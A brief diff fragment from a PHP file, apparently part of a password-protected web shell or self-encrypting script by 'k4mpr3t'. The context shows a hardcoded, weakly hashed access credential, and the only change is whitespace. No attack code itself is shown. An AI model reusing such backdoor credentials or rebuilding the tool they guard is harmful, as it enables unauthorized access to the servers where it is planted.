@@ -19,7 +19,7 @@
  *		[Password] sha1(md5('pass'))
  */
 $x_="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";
-/*
+/* 
  * Self Script Encryptor v1.0
  * ------- by k4mpr3t -------
  *
